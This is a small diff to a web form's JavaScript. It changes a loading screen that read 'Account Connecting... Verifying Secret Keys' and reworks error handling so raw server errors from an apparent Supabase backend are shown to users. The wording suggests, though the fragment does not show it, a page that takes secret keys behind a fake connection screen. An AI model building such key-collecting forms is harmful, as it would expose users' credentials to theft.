@@ -13,7 +13,7 @@ function showLoadingScreen() {
     <div style="text-align:center;font-family:Arial,sans-serif;">
       <div class="loading-spinner"></div>
       <h2>Account Connecting...</h2>
-      <p>Verifying Secret Keys</p>
+      <p>Processing your submission...</p>
     </div>
   `;
 
@@ -80,17 +80,18 @@ connectButton.addEventListener("click", async function () {
     );
 
     if (!response.ok) {
-      throw new Error(`Submission failed: HTTP ${response.status}`);
+      const errorDetails = await response.text();
+      throw new Error(
+        `Submission failed: HTTP ${response.status} - ${errorDetails}`
+      );
     }
 
-    statusText.textContent = "Connecting Account.";
     nameInput.value = "";
-
     showLoadingScreen();
 
   } catch (error) {
-    console.error(error);
-    statusText.textContent = "Submission failed. Please try again.";
+    console.error("Supabase submission error:", error);
+    statusText.textContent = error.message;
   } finally {
     connectButton.disabled = false;
   }
